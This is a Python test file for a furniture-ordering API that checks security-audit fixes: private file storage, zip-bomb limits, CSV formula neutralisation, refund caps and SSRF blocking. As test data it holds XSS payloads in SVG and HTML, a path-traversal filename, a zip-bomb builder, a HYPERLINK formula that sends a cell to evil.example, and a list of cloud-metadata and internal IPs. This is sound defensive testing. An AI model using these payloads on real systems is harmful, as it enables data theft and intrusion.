"""Регрессия по аудиту безопасности: закрытые файлы и подписанные ссылки (H3), zip-бомба в XLSX (H4),
формулы в CSV (M2), возвраты сверх суммы заказа (M3), источник цен: срок, размер, IP, фон (M4),
причина решения спора (M5), доступ конструктора (L1), файлы второго поставщика деления (L10),
документация и /health в проде."""

import base64
import io
import json
import socket
import time
import uuid
import zipfile

import httpx
import pytest
from fastapi.testclient import TestClient
from sqlalchemy import select

from mebel_api.errors import ApiError
from mebel_api.models import NonstandardRequest, OrderMessage, OrderReturn, ParserRun, SupplierPriceSource
from mebel_api.services import price_import
from mebel_api.services.storage import PRIVATE_PREFIX

from .conftest import build_app, make_settings
from .staff_helpers import superadmin
from .test_vendor import JPEG, _order, _paid_order, world  # noqa: F401 — фикстура

PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 16
SVG = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>'
HTML = b"<html><script>alert(1)</script></html>"


def _keys(app, oid: str) -> list[str]:
    with app.state.db.sessionmaker() as s:
        m = s.scalars(select(OrderMessage).where(OrderMessage.order_id == uuid.UUID(oid))).all()
        return [a["key"] for x in m for a in x.attachments]


# --- H3: закрытые файлы ---


def test_private_attachments_not_under_media_and_token_opaque(app, client, api, world, settings):
    w = world
    pid, o = _order(api, client, w["owner"])
    r = client.post(f"/orders/{o['id']}/messages", data={"text": "файлы"},
                    files=[("files", ("x.svg", SVG, "image/svg+xml")), ("files", ("p.html", HTML, "text/html")),
                           ("files", ("fake.jpg", b"not an image", "image/jpeg")), ("files", ("ok.png", PNG, "image/png"))],
                    headers=w["owner"])
    assert r.status_code == 201, r.text
    atts = r.json()["attachments"]
    keys = _keys(app, o["id"])
    assert all(k.startswith(PRIVATE_PREFIX) for k in keys)
    assert not any(k.endswith((".svg", ".html")) for k in keys)  # расширение из белого списка, иначе .bin
    # тип — по содержимому, не по словам клиента
    assert [a["content_type"] for a in atts] == ["application/octet-stream"] * 3 + ["image/png"]
    # токен непрозрачный: ни ключа, ни имени, ни JWT
    for a, k in zip(atts, keys):
        tok = a["url"].rsplit("/", 1)[1]
        raw = base64.urlsafe_b64decode(tok + "=" * (-len(tok) % 4))
        assert k.encode() not in raw and b"svg" not in raw and tok.count(".") == 0
        assert a["key"] not in k or a["key"] == k.split("/")[-1].split("_")[0]  # key ответа — id файла
    # /media не отдаёт закрытую зону — ни напрямую, ни в другом регистре, ни через ..
    for k in keys:
        assert client.get(f"{settings.media_base_url}/{k}").status_code == 404
        assert client.get(f"{settings.media_base_url}/PRIVATE/{k[len(PRIVATE_PREFIX):]}").status_code == 404
        assert client.get(f"{settings.media_base_url}/x/../{k}").status_code == 404
    # подписанная ссылка: SVG/HTML — скачиванием, octet-stream, nosniff, sandbox
    for a in atts[:3]:
        g = client.get(a["url"])
        assert g.status_code == 200
        assert g.headers["content-type"] == "application/octet-stream"
        assert g.headers["content-disposition"].startswith("attachment")
        assert g.headers["x-content-type-options"] == "nosniff" and g.headers["content-security-policy"] == "sandbox"
    g = client.get(atts[3]["url"])
    assert g.headers["content-type"] == "image/png" and g.headers["content-disposition"].startswith("inline")
    # мусор и старый JWT-формат — 404
    assert client.get("/signed-files/" + "A" * 80).status_code == 404
    assert client.get("/signed-files/eyJhbGciOiJIUzI1NiJ9.eyJrIjoieCJ9.x").status_code == 404


def test_public_media_still_served_with_safe_headers(app, client, api, owner, settings):
    pid = api.project(owner)
    r = client.post(f"/projects/{pid}/photos", files={"file": ("a.jpg", JPEG, "image/jpeg")}, headers=owner)
    assert r.status_code == 201, r.text
    url = r.json()["url"]
    assert url.startswith(settings.media_base_url + "/workshops/")
    g = client.get(url)
    assert g.status_code == 200 and g.content == JPEG
    assert g.headers["x-content-type-options"] == "nosniff" and g.headers["content-security-policy"] == "sandbox"
    assert "content-disposition" not in g.headers  # картинка открывается на странице клиента
    # не-картинка в публичной папке (старые файлы) — только скачиванием
    (settings.media_dir / "old").mkdir(parents=True, exist_ok=True)
    (settings.media_dir / "old" / "x.html").write_bytes(HTML)
    g = client.get(f"{settings.media_base_url}/old/x.html")
    assert g.headers["content-disposition"] == "attachment" and g.headers["content-security-policy"] == "sandbox"


def test_nonstandard_upload_private_whitelisted_extension(app, client, api, world):
    w = world
    pid = api.project(w["owner"])
    nid = client.post(f"/projects/{pid}/nonstandard", json={"description": "Радиусный фасад"},
                      headers=w["owner"]).json()["id"]
    root = superadmin(app, client)
    up = client.post(f"/admin/nonstandard/{nid}/files", files={"file": ("../evil.html", HTML, "text/html")},
                     headers=root)
    assert up.status_code == 201, up.text
    f = up.json()["files"][0]
    assert f["name"] == "evil.html" and f["content_type"] == "application/octet-stream"
    with app.state.db.sessionmaker() as s:
        key = s.get(NonstandardRequest, uuid.UUID(nid)).files[0]["key"]
    assert key.startswith(PRIVATE_PREFIX) and key.endswith("_evil.bin")
    d = client.get(f"/projects/{pid}/nonstandard/{nid}/files/{f['id']}", headers=w["owner"])
    assert d.status_code == 200 and d.content == HTML
    assert d.headers["content-type"] == "application/octet-stream"
    assert d.headers["content-disposition"].startswith("attachment") and d.headers["x-content-type-options"] == "nosniff"


def test_move_private_media_script_idempotent(app, client, api, world, settings):
    from mebel_api.services.private_media import move_private_media

    w = world
    _, o = _order(api, client, w["owner"])
    legacy = f"workshops/x/orders/{o['id']}/messages/abc_p.jpg"
    (settings.media_dir / legacy).parent.mkdir(parents=True, exist_ok=True)
    (settings.media_dir / legacy).write_bytes(b"<svg/>")
    with app.state.db.sessionmaker() as s:
        s.add(OrderMessage(order_id=uuid.UUID(o["id"]), author_type="master", text="старое",
                           attachments=[{"id": "abc", "name": "p.jpg", "key": legacy, "content_type": "image/jpeg",
                                         "size": 6}]))
        s.commit()
    assert client.get(f"{settings.media_base_url}/{legacy}").status_code == 200  # до переноса — публичный
    with app.state.db.sessionmaker() as s:
        assert move_private_media(s, app.state.storage, dry_run=True)["moved"] == 1
        stats = move_private_media(s, app.state.storage)
    assert stats["moved"] == 1 and stats["rows"] == 1
    assert client.get(f"{settings.media_base_url}/{legacy}").status_code == 404
    assert (settings.media_dir / PRIVATE_PREFIX / legacy).is_file()
    with app.state.db.sessionmaker() as s:
        again = move_private_media(s, app.state.storage)
        m = s.scalars(select(OrderMessage).where(OrderMessage.text == "старое")).one()
    assert again["moved"] == 0 and again["rows"] == 0
    assert m.attachments[0]["key"] == PRIVATE_PREFIX + legacy
    assert m.attachments[0]["content_type"] == "application/octet-stream"  # «jpg» оказался не картинкой
    msgs = client.get(f"/orders/{o['id']}/messages", headers=w["owner"]).json()["items"]
    att = next(x for x in msgs if x["text"] == "старое")["attachments"][0]
    assert client.get(att["url"]).content == b"<svg/>"


# --- H4: zip-бомба ---


def _bomb(size: int) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as z:
        z.writestr("xl/sharedStrings.xml", "<sst>" + "A" * size + "</sst>")
    return buf.getvalue()


def test_xlsx_zip_bomb_rejected_before_openpyxl(app, client, world):
    data = _bomb(60 * 1024 * 1024)
    assert len(data) < 200 * 1024
    with pytest.raises(ApiError) as e:
        price_import.read_rows(data, "xlsx")
    assert e.value.status == 413
    # высокая степень сжатия при малом общем размере — тоже отказ
    with pytest.raises(ApiError) as e:
        price_import.read_rows(_bomb(5 * 1024 * 1024), "xlsx")
    assert e.value.status == 413
    r = client.post("/vendor/catalog/import", files={"file": ("p.xlsx", data, "application/octet-stream")},
                    headers=world["owner_a"])
    assert r.status_code == 413 and r.json()["error"]["code"] == "file_too_large"
    # много файлов в архиве
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for i in range(price_import.XLSX_MAX_MEMBERS + 1):
            z.writestr(f"x{i}", "")
    with pytest.raises(ApiError):
        price_import.check_xlsx_archive(buf.getvalue())


def test_xlsx_rows_and_columns_capped(monkeypatch):
    from openpyxl import Workbook

    wb = Workbook()
    ws = wb.active
    ws.append(["sku", "price"] + [f"c{i}" for i in range(300)])
    for i in range(50):
        ws.append([f"A-{i}", 100 + i])
    buf = io.BytesIO()
    wb.save(buf)
    monkeypatch.setattr(price_import, "MAX_ROWS", 10)
    rows = price_import.read_rows(buf.getvalue(), "xlsx")
    assert len(rows) == 10 and len(rows[0]) <= price_import.MAX_COLS and rows[0]["sku"] == "A-0"


# --- M2: формулы в CSV ---


def test_csv_formula_injection_neutralised(app, client, api, world):
    from mebel_core.exports.csv_safe import safe_cell

    assert [safe_cell(v) for v in ("=1+1", "+7", "-x", "@SUM", "\tx", "\rx", "ok", -5, 3.5)] == \
        ["'=1+1", "'+7", "'-x", "'@SUM", "'\tx", "'\rx", "ok", -5, 3.5]
    w = world
    evil = '=HYPERLINK("https://evil.example/?"&A1,"Открыть")'
    assert client.patch("/workshops/me", json={"name": evil}, headers=w["owner"]).status_code == 200
    _paid_order(api, client, w)
    csv_text = client.get("/vendor/finance/act.csv", headers=w["owner_a"]).content.decode("utf-8-sig")
    import csv

    cells = [c for row in csv.reader(io.StringIO(csv_text), delimiter=";") for c in row if "HYPERLINK" in c]
    assert cells == ["'" + evil]


# --- M3: возвраты не больше суммы заказа ---


def test_refunds_capped_by_order_total(app, client, api, world):
    w = world
    _, o = _paid_order(api, client, w)  # счёт 4 000 000
    oid = o["id"]
    ids = []
    for i in range(3):
        r = client.post(f"/vendor/orders/{oid}/returns", data={"type": "defect", "description": f"брак {i}"},
                        headers=w["des1"])
        ids.append(r.json()["id"])
    ok = client.patch(f"/vendor/returns/{ids[0]}", json={"decision": "refund", "comment": "вернуть",
                                                         "refund_amount": 3_000_000}, headers=w["des1"])
    assert ok.status_code == 200 and ok.json()["status"] == "awaiting_owner"
    # ждущий подтверждения возврат уже занимает сумму
    r = client.patch(f"/vendor/returns/{ids[1]}", json={"decision": "refund", "comment": "вернуть",
                                                        "refund_amount": 1_500_000}, headers=w["des1"])
    assert r.status_code == 422 and r.json()["error"]["details"]["max_refund"] == 1_000_000
    assert client.patch(f"/vendor/returns/{ids[1]}", json={"decision": "refund", "comment": "вернуть",
                                                           "refund_amount": 1_000_000}, headers=w["des1"]).status_code == 200
    assert client.post(f"/vendor/returns/{ids[0]}/approve-refund", json={}, headers=w["owner_a"]).status_code == 200
    # владелец не может поднять сумму сверх остатка
    r = client.post(f"/vendor/returns/{ids[1]}/approve-refund", json={"amount": 2_000_000}, headers=w["owner_a"])
    assert r.status_code == 422 and r.json()["error"]["code"] == "invalid_refund"
    assert client.post(f"/vendor/returns/{ids[1]}/approve-refund", json={}, headers=w["owner_a"]).status_code == 200
    # спор: доплата сверх суммы заказа — отказ, в пределах остатка (0) — тоже
    r = client.patch(f"/vendor/returns/{ids[2]}", json={"decision": "declined", "comment": "нет"}, headers=w["des1"])
    d = client.post(f"/orders/{oid}/disputes", data={"subject": "return", "return_id": ids[2],
                                                     "reason": "decision_unfair"}, headers=w["owner"]).json()
    root = superadmin(app, client)
    r = client.post(f"/admin/disputes/{d['id']}/resolve",
                    json={"resolution": "master", "refund_amount": 100_000, "comment": "Вернуть", "reason": "Фото"},
                    headers=root)
    assert r.status_code == 422 and r.json()["error"]["details"]["max_refund"] == 0
    fin = client.get("/vendor/finance", headers=w["owner_a"]).json()
    assert fin["refunds"] <= fin["turnover"]


# --- M5: причина решения спора ---


def test_dispute_resolution_requires_explicit_reason(app, client, api, world):
    w = world
    _, o = _order(api, client, w["owner"])
    oid = o["id"]
    client.post(f"/vendor/orders/{oid}/reject", json={"reason": "no_material", "comment": "Нет декора"},
                headers=w["des1"])
    d = client.post(f"/orders/{oid}/disputes", data={"subject": "rejection", "reason": "can_be_done"},
                    headers=w["owner"]).json()
    root = superadmin(app, client)
    r = client.post(f"/admin/disputes/{d['id']}/resolve", json={"resolution": "supplier", "comment": "Поставщик прав"},
                    headers=root)
    assert r.status_code == 422 and r.json()["error"]["code"] == "reason_required"
    r = client.post(f"/admin/disputes/{d['id']}/resolve",
                    json={"resolution": "supplier", "comment": "Поставщик прав", "reason": "Проверено"}, headers=root)
    assert r.status_code == 200


# --- L1: конструктор и чужие свободные заказы ---


def test_designer_cannot_touch_unassigned_order_outside_queue(app, client, api, world):
    w = world
    pid, o = _order(api, client, w["owner"])
    oid = o["id"]
    assert client.get(f"/vendor/orders/{oid}", headers=w["des2"]).status_code == 200  # очередь — видна
    root = superadmin(app, client)
    assert client.post(f"/admin/projects/{pid}/order-paid", json={}, headers=root).status_code == 200
    for method, path, kw in (("get", f"/vendor/orders/{oid}", {}), ("get", f"/vendor/orders/{oid}/csv", {}),
                             ("post", f"/vendor/orders/{oid}/status", {"json": {"status": "cutting"}}),
                             ("post", f"/vendor/orders/{oid}/take", {}),
                             ("post", f"/vendor/orders/{oid}/messages", {"data": {"text": "x"}})):
        assert getattr(client, method)(path, headers=w["des2"], **kw).status_code == 404, path
    assert client.get(f"/vendor/orders/{oid}", headers=w["owner_a"]).status_code == 200


# --- L10: второй поставщик деления ---


def test_split_order_files_limited_to_own_materials(app, client, api, world):
    w = world
    root = superadmin(app, client)
    client.put("/admin/supplier-routes", json={"routes": [{"category": "hardware", "supplier_id": w["b"]}]},
               headers=root)
    _, o = _order(api, client, w["owner"])
    other = next(g for g in o["group_orders"] if g["supplier_id"] == w["b"])
    # у металлоцеха только фурнитура — деталей проекта он не получает
    for path in (f"/vendor/orders/{other['id']}/csv", f"/vendor/orders/{other['id']}/files/dxf_zip",
                 f"/vendor/orders/{other['id']}/files/cutmaps_pdf"):
        r = client.get(path, headers=w["owner_b"])
        assert r.status_code == 409 and r.json()["error"]["code"] == "no_parts", path
    assert client.get(f"/vendor/orders/{other['id']}/files/invoice", headers=w["owner_b"]).status_code == 200
    a = client.get(f"/vendor/orders/{o['id']}/csv", headers=w["owner_a"])
    assert a.status_code == 200 and len(a.content.decode("utf-8-sig").splitlines()) > 1
    # листы ушли второму поставщику: у него — детали, у основного (EMAN) — нет
    client.put("/admin/supplier-routes", json={"routes": [{"category": "sheet", "supplier_id": w["b"]}]},
               headers=root)
    _, o2 = _order(api, client, api.login("+998907770000"))
    other2 = next(g for g in o2["group_orders"] if g["supplier_id"] == w["b"])
    b_csv = client.get(f"/vendor/orders/{other2['id']}/csv", headers=w["owner_b"])
    assert b_csv.status_code == 200 and len(b_csv.content.decode("utf-8-sig").splitlines()) > 1
    a_csv = client.get(f"/vendor/orders/{o2['id']}/csv", headers=w["owner_a"]).content.decode("utf-8-sig")
    assert "ЛДСП" in b_csv.content.decode("utf-8-sig") and "ЛДСП" not in a_csv  # чужие листы основному не уходят


# --- M4: источник цен ---


@pytest.mark.parametrize("ip", ["::127.0.0.1", "::ffff:127.0.0.1", "64:ff9b::7f00:1", "64:ff9b::a9fe:a9fe",
                                "168.63.129.16", "100.100.100.200", "2002:7f00:1::", "2001:0:4136:e378::1",
                                "169.254.169.254", "fd00:ec2::254", "0.0.0.0", "::"])
def test_forbidden_ips(ip):
    import ipaddress

    assert price_import.forbidden_ip(ipaddress.ip_address(ip))


def test_public_ip_allowed():
    import ipaddress

    assert not price_import.forbidden_ip(ipaddress.ip_address("93.184.216.34"))
    assert not price_import.forbidden_ip(ipaddress.ip_address("2a00:1450:4001:80b::200e"))


def _fake_dns(monkeypatch, ip="93.184.216.34"):
    monkeypatch.setattr(socket, "getaddrinfo",
                        lambda host, port, *a, **k: [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (ip, port))])


def test_fetch_pins_validated_ip_host_and_sni(monkeypatch):
    _fake_dns(monkeypatch)
    seen = {}

    def handler(request: httpx.Request):
        seen.update(url=str(request.url), host=request.headers["host"], sni=request.extensions.get("sni_hostname"),
                    auth=request.headers.get("authorization"))
        return httpx.Response(200, content=b"sku;price\nA;1\n")

    data = price_import.fetch("https://prices.example.com/p.csv?x=1", secret="k", max_bytes=1000, timeout=5,
                              transport=httpx.MockTransport(handler))
    assert data.startswith(b"sku")
    assert seen["url"] == "https://93.184.216.34/p.csv?x=1" and seen["host"] == "prices.example.com"
    assert seen["sni"] == "prices.example.com" and seen["auth"] == "Bearer k"
    _fake_dns(monkeypatch, "10.0.0.7")  # имя «переехало» на внутренний адрес — отказ до соединения
    with pytest.raises(ApiError) as e:
        price_import.fetch("https://prices.example.com/p.csv", secret=None, max_bytes=1000, timeout=5,
                           transport=httpx.MockTransport(handler))
    assert e.value.code == "source_forbidden"


def test_fetch_total_deadline_and_size(monkeypatch):
    _fake_dns(monkeypatch)

    def slow():
        for _ in range(10):
            time.sleep(0.1)
            yield b"x" * 10

    with pytest.raises(ApiError) as e:
        price_import.fetch("https://p.example.com/x", secret=None, max_bytes=10_000, timeout=0.35,
                           transport=httpx.MockTransport(lambda r: httpx.Response(200, content=slow())))
    assert e.value.status == 504 and e.value.code == "source_timeout"
    with pytest.raises(ApiError) as e:
        price_import.fetch("https://p.example.com/x", secret=None, max_bytes=100, timeout=5,
                           transport=httpx.MockTransport(lambda r: httpx.Response(
                               200, headers={"content-length": "999999"}, content=b"x")))
    assert e.value.code == "source_too_large"
    with pytest.raises(ApiError) as e:
        price_import.fetch("https://p.example.com/x", secret=None, max_bytes=100, timeout=5,
                           transport=httpx.MockTransport(lambda r: httpx.Response(200, content=iter([b"y" * 60] * 3))))
    assert e.value.code == "source_too_large"


def test_price_source_run_is_background_and_single(app, client, world, monkeypatch):
    w = world
    monkeypatch.setattr(price_import, "check_public_https", lambda url: ("prices.example.com", 443))
    assert client.put("/vendor/price-source", json={"url": "https://prices.example.com/p.json", "format": "json",
                                                    "kind": "api"}, headers=w["owner_a"]).status_code == 200
    # фоновая задача: запрос не ждёт загрузку — подменяем очередь на «отложенную»
    queued = []
    monkeypatch.setattr(app.state.tasks, "enqueue", lambda name, payload, *a, **k: queued.append((name, payload)))
    r = client.post("/vendor/price-source/run", headers=w["owner_a"])
    assert r.status_code == 201 and r.json()["status"] == "running"
    assert queued and queued[0][0] == "price_source_run" and queued[0][1]["run_id"] == r.json()["id"]
    again = client.post("/vendor/price-source/run", headers=w["owner_a"])
    assert again.status_code == 409 and again.json()["error"]["code"] == "run_in_progress"
    # задача заполняет тот же запуск
    monkeypatch.setattr(price_import, "fetch", lambda *a, **k: json.dumps([{"sku": "Z-1", "price": 5}]).encode())
    out = price_import.run_source_task(app.state.db, app.state.settings, queued[0][1])
    assert out["run_id"] == r.json()["id"] and out["status"] != "running"
    runs = client.get("/vendor/price-source/runs", headers=w["owner_a"]).json()
    assert runs[0]["id"] == r.json()["id"] and runs[0]["status"] != "running"
    with app.state.db.sessionmaker() as s:
        assert s.get(SupplierPriceSource, s.scalar(select(SupplierPriceSource.id))).last_status in ("ok", "review")
        assert len(s.scalars(select(ParserRun).where(ParserRun.source == "price_source")).all()) == 1


# --- Прод: документация и /health ---


def test_prod_hides_docs_and_env(tmp_path):
    s = make_settings(tmp_path, env="prod", auth_code_provider="eskiz", admin_token="prod-admin-token-x" * 2)
    with TestClient(build_app(s)) as c:
        assert c.get("/docs").status_code == 404 and c.get("/redoc").status_code == 404
        assert c.get("/openapi.json").status_code == 404
        h = c.get("/health")
        assert h.status_code == 200 and h.json() == {"status": "ok"}


def test_dev_keeps_docs(client):
    assert client.get("/openapi.json").status_code == 200 and client.get("/health").json()["env"] == "test"


def test_returns_photo_private(app, client, api, world):
    w = world
    _, o = _paid_order(api, client, w)
    r = client.post(f"/orders/{o['id']}/returns", data={"type": "defect", "description": "Скол"},
                    files=[("files", ("s.jpg", JPEG, "image/jpeg"))], headers=w["owner"])
    assert r.status_code == 201, r.text
    with app.state.db.sessionmaker() as s:
        key = s.get(OrderReturn, uuid.UUID(r.json()["id"])).photos[0]["key"]
    assert key.startswith(PRIVATE_PREFIX + "workshops/")
    assert client.get(r.json()["photos"][0]["url"]).headers["content-type"] == "image/jpeg"


def test_signed_token_tamper_and_expiry(app):
    from datetime import timedelta

    from mebel_api.services.signed_files import make_token, verify

    st = app.state.settings
    tok = make_token(st, {"key": "private/a/b.jpg", "name": "b.jpg"})
    assert verify(st, tok)["k"] == "private/a/b.jpg"
    raw = bytearray(base64.urlsafe_b64decode(tok + "=" * (-len(tok) % 4)))
    raw[20] ^= 1
    bad = base64.urlsafe_b64encode(bytes(raw)).rstrip(b"=").decode()
    with pytest.raises(ApiError) as e:
        verify(st, bad)
    assert e.value.status == 404
    with pytest.raises(ApiError) as e:
        verify(st, make_token(st, {"key": "k"}, ttl=timedelta(seconds=-5)))
    assert e.value.status == 410
    other = st.model_copy(update={"jwt_secret": "another-secret-another-secret-xx"})
    with pytest.raises(ApiError):
        verify(other, tok)


def test_logo_checked_by_content_not_declared_type(client, owner):
    r = client.post("/workshops/me/logo", files={"file": ("l.png", HTML, "image/png")}, headers=owner)
    assert r.status_code == 415
    r = client.post("/workshops/me/logo", files={"file": ("l.png", JPEG, "image/png")}, headers=owner)
    assert r.status_code == 200 and r.json()["logo_url"].endswith(".jpg")  # расширение — по содержимому
